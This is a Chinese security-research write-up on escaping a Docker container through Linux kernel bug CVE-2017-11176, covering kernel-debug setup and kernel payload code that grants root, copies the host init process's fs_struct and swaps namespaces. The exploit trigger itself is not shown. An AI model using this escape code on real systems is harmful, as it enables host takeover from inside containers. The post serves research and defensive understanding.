**作者：H4iiluv@青藤实验室  
原文链接：<https://mp.weixin.qq.com/s/ea8YLaXjSjKcN4MNgMi2aQ>**

## 1 前言

Docker是时下使用范围最广的开源容器技术之一，具有高效易用等优点。由于设计的原因，Docker天生就带有强大的安全性，甚至比虚拟机都要更安全，但如此的Docker也会被人攻破，Docker逃逸所造成的影响之大几乎席卷了全球的Docker容器。

下面是网上找的一张docker的架构图。

![16068218810481](https://images.seebug.org/content/images/2021/06/10/1623292495000-16068218810481.jpg-w331s)

近些年，Docker逃逸所利用的漏洞大部分都发生在shim和runc上，每一次出现相关漏洞都能引起相当大的关注。

除了Docker本身组件的漏洞可以进行Docker逃逸之外，Linux内核漏洞也可以进行逃逸。因为容器的内核与宿主内核共享，使用Namespace与Cgroups这两项技术，使容器内的资源与宿主机隔离，所以Linux内核产生的漏洞能导致容器逃逸。

本文就来尝试利用一个内核漏洞在最新版的Docker上实现逃逸。

## 2 内核调试环境搭建

因为是利用Linux内核漏洞进行Docker逃逸，内核调试环境搭建是必不可少的，已经熟悉Linux内核调试的读者可以跳过这节。

本文的测试操作系统环境是：

    
    
    虚拟机：vmware workstation 16
    linux发行版：Centos 7.2.1511 2个CPU 2G内存
    linux内核(使用uname -r查看)：3.10.0-327.el7.x86_64

### 2.1 下载安装指定的内核版本对应的符号包

    
    
    自己去网上找对应的内核符号包下载安装
    
    安装命令
    
        sudo rpm -i kernel-debuginfo-3.10.0-327.el7.x86_64.rpm
        sudo rpm -i kernel-debuginfo-common-x86_64-3.10.0-327.el7.x86_64.rpm

### 2.2 下载指定的内核版本对应的源码包

    
    
    得自己去网上找对应的内核源码包下载
    
        kernel-3.10.0-327.el7.src.rpm

### 2.3 grub配置

    
    
    安装好内核和内核符号包之后就可以去/boot/grub2/grub.cfg里复制指定内核的menuentry
    
        sudo gedit /boot/grub2/grub.cfg
    
    将复制的menuentry粘贴到/etc/grub.d/40_custom文件中
    
        sudo gedit /etc/grub.d/40_custom
    
    在linux16启动命令这一行后面添加一行指令
    
        kgdbwait kgdb8250=io,03f8,ttyS0,115200,4 kgdboc=ttyS0,115200 kgdbcon
    
    如下例子：
    
        #!/bin/sh
        exec tail -n +3 $0
        # This file provides an easy way to add custom menu entries.  Simply type the
        # menu entries you want to add after this comment.  Be careful not to change
        # the 'exec tail' line above.
        menuentry '(Debug)' --class centos --class gnu-linux --class gnu --class os --unrestricted $menuentry_id_option  {
                load_video
                set gfxpayload=keep
                insmod gzio
                insmod part_msdos
                insmod xfs
                set root='hd0,0'
                if [ x$feature_platform_search_hint = xy ]; then
                search --no-floppy --fs-uuid --set=root e1fba75c-a2c9-4f39-9446-34a78704a68e
                else
                search --no-floppy --fs-uuid --set=root e1fba75c-a2c9-4f39-9446-34a78704a68e
                fi
                linux16 /vmlinuz-3.10.0-327-generic root=UUID=e1fba75c-a2c9-4f39-9446-34a78704a68e ro acpi=off quiet LANG=en_US.UTF-8 kgdbwait kgdb8250=io,03f8,ttyS0,115200,4 kgdboc=ttyS0,115200 kgdbcon
                initrd16 /boot/initrd.img-3.10.0-327-generic
        }
    
    要想在调试中关闭kaslr可以加上nokaslr,要想在本次调试中关闭smep可以加上nosmep,要想在本次调试中关闭smap可以加上nosmap,要想在本次调试中关闭KPTI可以加上nopti
    
        kgdbwait kgdb8250=io,03f8,ttyS0,115200,4 kgdboc=ttyS0,115200 kgdbcon nokaslr nosmep nosmap nopti
    
    复制粘贴修改保存好后执行
    
        sudo grub2-mkconfig -o /boot/grub2/grub.cfg

### 2.4 虚拟机设置

#### 2.4.1 host & target

    
    
    将安装好指定内核，指定内核符号包以及指定内核源码包的虚拟机复制一份，一份作为host,一份作为target,之后在target上执行exp,在host上对target进行调试
    
    在host上添加串行端口
    
        -移除打印机，添加串行端口，管道名//./pipe/com_1,该端是客户端，另一端是虚拟机
    
    在target上添加串行端口
    
        -移除打印机，添加串行端口，管道名//./pipe/com_1,该端是服务器端，另一端是虚拟机

#### 2.4.2 开始调试

    
    
    1.先正常启动host
    2.再启动target,不过启动的时候需要在grub时选择我们之前在/etc/grub.d/40_custom添加的调试内核，它正常会显示在grub选择中的,选择好后，target会显示等待附加调试界面
    3.在host的shell中执行以下gdb命令附加target调试
    
    gdb -s /usr/lib/debug/lib/modules/3.10.0-327.el7.x86_64/vmlinux
    set architecture i386:x86-64:intel
    add-symbol-file /usr/lib/debug/lib/modules/3.10.0-327.el7.x86_64/vmlinux 0xffffffff81000000
    set serial baud 115200
    target remote /dev/ttyS0 nsproxy;

以上步骤就完成了内核环境搭建，下面开始进入正题，利用内核漏洞进行Docker逃逸。

## 3 利用内核漏洞进行Docker逃逸

本文使用的内核漏洞为CVE-2017-11176,这个漏洞网上有很多人分析过了，在利用它进行docker逃逸前提是已经将这个漏洞适配到当前的系统中，即能成功提权。本文不关注内核漏洞的利用，默认已经适配成功。

![image-20210608121118867](https://images.seebug.org/content/images/2021/06/10/1623292496000-image-20210608121118867.png-w331s)

本文的Docker容器逃逸测试环境是：

    
    
    虚拟机：vmware workstation 16
    linux发行版：Centos 7.2.1511 2个CPU 2G内存
    linux内核(使用uname -r查看)：3.10.0-327.el7.x86_64
    Docker(最新版)：20.10.7
    使用的Linux内核漏洞:CVE-2017-11176

### 3.1 安装最新版的Docker

    
    
    1.安装工具
    sudo yum install -y yum-utils device-mapper-persistent-data lvm2
    
    2.设置阿里镜像，访问速度更快一些
    sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
    
    3.更新yum缓存
    sudo yum makecache fast
    
    4.查看可用的社区版
    yum list docker-ce --showduplicates | sort -r
    
    5.安装指定版本的docker,选择最新版
    sudo yum install -y docker-ce-20.10.7-3.el7
    
    6.关闭防火墙
    systemctl disable firewalld
    systemctl stop firewalld
    
    7.设置docker开机自启动
    systemctl start docker
    systemctl enable docker
    
    8.查看docker版本
    $ docker version
    Client: Docker Engine - Community
     Version:           20.10.7
     API version:       1.41
     Go version:        go1.13.15
     Git commit:        f0df350
     Built:             Wed Jun  2 11:58:10 2021
     OS/Arch:           linux/amd64
     Context:           default
     Experimental:      true
    
    Server: Docker Engine - Community
     Engine:
      Version:          20.10.7
      API version:      1.41 (minimum version 1.12)
      Go version:       go1.13.15
      Git commit:       b0f5bc3
      Built:            Wed Jun  2 11:56:35 2021
      OS/Arch:          linux/amd64
      Experimental:     false
     containerd:
      Version:          1.4.6
      GitCommit:        d71fcd7d8303cbf684402823e425e9dd2e99285d
     runc:
      Version:          1.0.0-rc95
      GitCommit:        b9ee9c6314599f1b4a7f497e1f1f856fe433d3b7
     docker-init:
      Version:          0.19.0
      GitCommit:        de40ad0

### 3.2 逃逸开始

#### 3.2.1 获得了"root"

先创建并启动一个容器

    
    
    # docker run --restart=always -it --name=docker_escape centos:latest /bin/bash                                  
    Unable to find image 'centos:latest' locally
    latest: Pulling from library/centos
    7a0437f04f83: Pull complete 
    Digest: sha256:5528e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1
    Status: Downloaded newer image for centos:latest
    [root@f165d7d75c72 /]#

将漏洞利用程序复制到容器中

    
    
    # docker cp exploit f165d7d75c72:/tmp
    在容器内创建一个普通权限的用户test,然后执行漏洞利用程序
    [root@f165d7d75c72 /]# adduser test
    [root@f165d7d75c72 /]# su test
    [test@f165d7d75c72 /]$ cd tmp/
    [test@f165d7d75c72 /]$ ./exploit

在执行完漏洞利用程序后，我们获得了root shell

![image-20210608140423923](https://images.seebug.org/content/images/2021/06/10/1623292496000-image-20210608140423923.png-w331s)

我们确实在容器内从普通权限提升到了root权限，但是这和宿主机里的root权限是一样的么？

我们查看一下进程列表以及尝试打印/home/test目录下的内容

![image-20210608141049012](https://images.seebug.org/content/images/2021/06/10/1623292497000-image-20210608141049012.png-w331s)

很明显我们没有获得宿主机的root权限，我们依旧被困在了容器内。这是为什么呢？

#### 3.2.2 替换fs_struct结构

目前我们的漏洞利用程序里只是获取了root权限

    
    
    static void getroot(void)
    {
        commit_creds(prepare_kernel_cred(NULL));
    }

这个root权限还只是限制在容器内。

让我们看看Linux kernel 内管理进程的结构task_struct

    
    
    struct task_struct {
        /* ... */
        /*
         * Pointers to the (original) parent process, youngest child, younger sibling,
         * older sibling, respectively.  (p->father can be replaced with
         * p->real_parent->pid)
         */
    
        /* Real parent process: */
        struct task_struct __rcu    *real_parent;
    
        /* Recipient of SIGCHLD, wait4() reports: */
        struct task_struct __rcu    *parent;
        /* ... */
        /* Filesystem information: */
        struct fs_struct        *fs;
        /* ... */
    }

可以看到有一个struct fs_struct *fs结构指针，它的描述为Filesystem information。再看看struct
fs_struct的内容

    
    
    struct fs_struct {
        int users;
        spinlock_t lock;
        seqcount_t seq;
        int umask;
        int in_exec;
        struct path root, pwd;
    } __randomize_layout;

这个结构中的struct path root, pwd就是代表当前进程的根目录以及工作目录。

task_struct->fs 存放着进程根目录以及工作目录，而我们能够用 task_struct->real_parent 回溯取得父进程的
task_struct，我们不断往上回溯，直到找到定位到pid=1的进程，也就是当前这个容器在宿主机中的初始进程，把这个初始进程的fs_struct复制到我们的利用程序进程，就可以将我们的漏洞利用进程的根目录设置到宿主机中了！

代码体现如下

    
    
    static void getroot(void)
    {
        commit_creds(prepare_kernel_cred(NULL));//将当前进程设置为root权限
    
        void * userkpid = find_get_pid(userpid);
        struct task_struct *mytask = pid_task(userkpid,PIDTYPE_PID);//获取当前进程的task_struct结构体
    
        //循环编译task_struct链，找到pid=1的进程的task_struct的结构体
        char *task;
        char *init;
        uint32_t pid_tmp = 0;
        task = (char *)mytask;
        init = task;
        while (pid_tmp != 1) {
              init = *(char **)(init + TASK_REAL_PARENT_OFFSET);
              pid_tmp = *(uint32_t *)(init + TASK_PID_OFFSET);
        }
    
        //将pid=1的task struct的fs_struct结构复制为当前进程的fs_struct
        *(uint64_t *)((uint64_t)mytask + TASK_FS_OFFSET) = copy_fs_struct(*(uint64_t *)((uint64_t)init + TASK_FS_OFFSET));
    }

用 while循环不断回溯task_struct->real_parent找到Init process，之后调用copy_fs_struct函数把
fs_struct复制到漏洞利用进程，就能进入宿主机的目录了。

在漏洞利用程序中添加完上面的代码，我们再一次执行漏洞利用程序。

![image-20210608151347161](https://images.seebug.org/content/images/2021/06/10/1623292497000-image-20210608151347161.png-w331s)

显然我们已经跑到宿主机中来了，已经实现了容器逃逸。本文基本到此结束了。

关机下班！但是当我们准备执行shutdown -h now命令时，发现找不到shutdown命令。

![image-20210608151949420](https://images.seebug.org/content/images/2021/06/10/1623292497000-image-20210608151949420.png-w331s)

从图中可以看到我们也无法kill掉任何进程，也无法执行一些命令。虽然我们已经逃逸成功了，但是出现的这些小问题又是什么原因导致的呢？

shutdown找不到可以理解，shutdown是在/sbin目录下，这里是环境变量没有设置的原因，所以找不到shutdown，可以通过/sbin/shutdown直接执行。

#### 3.2.3 突破namesapce

Linux 容器利用了 Linux 命名空间的基本虚拟化概念。命名空间是 Linux 内核的一个特性，它在操作系统级别对内核资源进行分区。Docker
容器使用 Linux 内核命名空间来限制任何用户（ **包括 root** ）直接访问机器的资源。

有没有可能是因为namespace限制的呢？如果是namespace的原因，那有没有办法改变漏洞利用进程的namespace呢？

通过查找资料，找到了一种切换namespace的方案。

命名空间在内核里被抽象成为一个数据结构 struct nsproxy， 其定义如下

    
    
    struct nsproxy {
        atomic_t count;
        struct uts_namespace *uts_ns;
        struct ipc_namespace *ipc_ns;
        struct mnt_namespace *mnt_ns;
        struct pid_namespace *pid_ns_for_children;
        struct net          *net_ns;
        struct time_namespace *time_ns;
        struct time_namespace *time_ns_for_children;
        struct cgroup_namespace *cgroup_ns;
    };

在task_struct结构中，存在一项struct nsproxy *nsproxy指向当前进程所属的namespace。

    
    
    struct task_struct {
        ......
        /* namespaces */
        struct nsproxy *nsproxy;
        ......
    }

与上一节替换fs_struct结构相似，我们需要想办法替换这个结构。

系统初始化时，会初始化一个全局的命名空间， **init_nsproxy** 。替换方案就是将漏洞利用进程的nsproxy替换为init_nsproxy。

代码体现如下

    
    
    static void getroot(void)
    {
        commit_creds(prepare_kernel_cred(NULL));//将当前进程设置为root权限
    
        void * userkpid = find_get_pid(userpid);
        struct task_struct *mytask = pid_task(userkpid,PIDTYPE_PID);//获取当前进程的task_struct结构体
    
        //循环编译task_struct链，找到pid=1的进程的task_struct的结构体
        char *task;
        char *init;
        uint32_t pid_tmp = 0;
        task = (char *)mytask;
        init = task;
        while (pid_tmp != 1) {
              init = *(char **)(init + TASK_REAL_PARENT_OFFSET);
              pid_tmp = *(uint32_t *)(init + TASK_PID_OFFSET);
        }
    
        //将pid=1的task struct的fs_struct结构复制为当前进程的fs_struct
        *(uint64_t *)((uint64_t)mytask + TASK_FS_OFFSET) = copy_fs_struct(*(uint64_t *)((uint64_t)init + TASK_FS_OFFSET));
    
        //切换当前进程的namespace为pid=1的进程的namespace
        unsigned long long g = find_task_by_vpid(1);
        switch_task_namespaces(( void *)g, (void *)INIT_NSPROXY);
        long fd_mnt = do_sys_open( AT_FDCWD, "/proc/1/ns/mnt", O_RDONLY, 0);
        setns( fd_mnt, 0);
        long fd_pid = do_sys_open( AT_FDCWD, "/proc/1/ns/pid", O_RDONLY, 0);
        setns( fd_pid, 0);
    }

上述替换namespace的代码部分,就是先将容器中pid=1的进程的namespace用switch_task_namespaces函数替换为init_nsproxy，之后漏洞程序进程再执行setns函数加入pid=1的进程的namespace，相当于加入init_nsproxy。

switch_task_namespaces函数代码如下

    
    
    void switch_task_namespaces(struct task_struct *p, struct nsproxy *new)
    {
        struct nsproxy *ns;
    
        might_sleep();
    
        task_lock(p);
        ns = p->nsproxy;
        p->nsproxy = new;
        task_unlock(p);
    
        if (ns)
            put_nsproxy(ns);
    }

switch_task_namespaces这个函数就是将参数一struct task_struct
*p的namespace修改为参数二传进来的namespace。

在漏洞利用程序中添加完上面的代码，我们再一次执行漏洞利用程序。

![image-20210608184857152](https://images.seebug.org/content/images/2021/06/10/1623292497000-image-20210608184857152.png-w331s)

当梦想照进现实，你满怀期待迎接阳光，现实却给你泼了一滩冰水。

很遗憾，没有成功突破namesapce。:(

是什么原因呢？我修改上述漏洞程序代码

    
    
    static void getroot(void)
    {
        commit_creds(prepare_kernel_cred(NULL));//将当前进程设置为root权限
    
        void * userkpid = find_get_pid(userpid);
        struct task_struct *mytask = pid_task(userkpid,PIDTYPE_PID);//获取当前进程的task_struct结构体
    
        //循环编译task_struct链，找到pid=1的进程的task_struct的结构体
        char *task;
        char *init;
        uint32_t pid_tmp = 0;
        task = (char *)mytask;
        init = task;
        while (pid_tmp != 1) {
              init = *(char **)(init + TASK_REAL_PARENT_OFFSET);
              pid_tmp = *(uint32_t *)(init + TASK_PID_OFFSET);
        }
    
        //将pid=1的task struct的fs_struct结构复制为当前进程的fs_struct
        *(uint64_t *)((uint64_t)mytask + TASK_FS_OFFSET) = copy_fs_struct(*(uint64_t *)((uint64_t)init + TASK_FS_OFFSET));
    
        //切换当前进程的namespace为pid=1的进程的namespace
        unsigned long long g = find_task_by_vpid(userpid);
        switch_task_namespaces(( void *)g, (void *)INIT_NSPROXY);
    }

直接切换当前进程的namespace。并且在漏洞程序完成利用从内核退出时通过命令ls /proc/$(userpid)/ns
-lia打印当前进程的namespace,将结果与宿主机中高权限进程的namespace对比。

![image-20210609172454298](https://images.seebug.org/content/images/2021/06/10/1623292498000-image-20210609172454298.png-w331s)

可以看到，我们成功替换了namespace。

继续在漏洞程序完成利用从内核退出时通过命令ls /home/test打印目录内容，发现可以看到宿主机的文件，说明我们逃逸成功了

![image-20210609174910475](https://images.seebug.org/content/images/2021/06/10/1623292498000-image-20210609174910475.png-w331s)

继续在漏洞程序完成利用从内核退出时通过命令kill -9
pid尝试kill掉某个我们事先已知的进程，测试发现我们也可以成功kill掉，说明我们成功突破了namespace。

只是在漏洞程序结尾时调用execve弹root shell时会失败，暂时不能弹出一个方便操作的root shell。

虽然我这边没有成功弹出一个方便的root
shell，原因暂时没有分析出来，但这个思路是可行的。查阅资料时有人在ubuntu上测试成功了，估计和我测试时的操作系统有关，需要进一步分析。

### 3.3 一般步骤

经过上述的一系列尝试，我们可以总结一下利用内核漏洞进行容器逃逸的一般步骤。

1.使用内核漏洞进入内核上下文 2.获取当前进程的task struct 3.回溯task list 获取pid=1的task
struct，复制其fs_struct结构数据为当前进程的fs_struct。fs_struct结构中定义了当前进程的根目录和工作目录。
4.切换当前namespace。Docker使用了Linux内核名称空间来限制用户(包括root)直接访问机器资源。 5.打开root shell，完成逃逸

## 4 结语

本文介绍了利用Linux内核漏洞进行Docker容器逃逸，使用的漏洞是CVE-2017-11176,在最新版的docker上逃逸成功了。虽然在突破namespace的限制时遇到了一点小问题，但本次基本实现了利用Linux内核漏洞完成Docker容器逃逸，希望这篇文章给能大家带来一些帮助。

## 5 参考链接

<https://teamt5.org/tw/posts/container-escape-101/>

<https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1602/>

